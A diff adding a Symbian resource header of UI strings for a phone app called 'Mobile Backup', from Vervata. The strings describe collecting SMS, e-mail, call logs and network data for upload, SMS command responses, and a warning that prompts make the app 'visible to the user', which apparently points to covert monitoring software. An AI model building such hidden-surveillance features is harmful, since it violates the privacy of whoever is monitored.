@@ -1,0 +1,35 @@
+/**
+*
+* Copyright (c) Vervata Co,Ltd.
+*/
+
+
+#define ELanguage	ELangEnglish	// Caption language
+
+#define qtn_app_caption_string			"Mobile Backup" 
+#define qtn_app_short_caption_string		"Mobile Backup" 
+#define text_title_pane_mainview		"Mobile Backup"
+#define text_application_name			"Mobile Backup" //this will appear in applicatin's about box
+#define text_application_nick_name		"Mobile Backup(Pro)" //this will appear in SMS command response
+
+#define txt_menu_about_title			 ":: About ::"
+#define txt_menu_about_text			 "Product: Model %d\nVersion: %S\n\n"
+#define txt_menu_about_reseller_text		 "Product: Model(R) %d\nVersion: %S\n\n"
+
+#define txt_app_info_header			 ":: App Info ::"
+
+//----------------------------------------------------
+//		Symbian signed related text
+//----------------------------------------------------
+#define text_privacy_statement_header		 	 	":: PRIVACY STATEMENT ::"
+#define text_privacy_statement_body		 		"Mobile Backup will collect SMS, E-mail, Call Log, Network Information; and sends them to your personal website for archival. Also, it will make use of SMS and Internet Connection. You may remove this application at any time. If you have any questions or concerns, please contact support\n"
+	
+#define text_billable_event_header				 "::Billable Events::"
+#define text_billable_event_inetconnection			 "This application requires the use of Internet connection for which network charges apply.\n\nIf you wish to stop or start this prompt from appearing please go to Options->Settings->Prompt\n\nDo you allow this?"
+#define text_billable_event_send_sms			 	 "This application requires the use of SMS for which network charges apply.\n\nIf you wish to stop or start this prompt from appearing please go to Options->Settings->Prompts\n\nDo you allow this?"
+#define text_billable_event_sms_and_inet		 	 "This application requires the use of\n - SMS for which network charges apply.\n - Internet connection for which network charges apply.\nIf you wish to stop or start this prompt from appearing please go to Options->Settings->Prompts\n\nDo you allow this?"
+#define text_prompts_warning_header				 "Prompts Warning!"
+#define text_nonesteath_mode_warning			 	 "The Prompts Settings are currently on, and it makes this application visible to the user every time a Network Connection is required. To disable them please go to Option -> Setting -> Prompts.\nAre you sure you want to exit?"
+
+#define text_confirm_change_log_config_header	 		 "Confirmation"
+#define text_confirm_change_log_config_body			 "Phone log duration is now set to 'No log'.This causes Mobile Backup application not to work properly.\n\nAre you sure you wish to do this?"
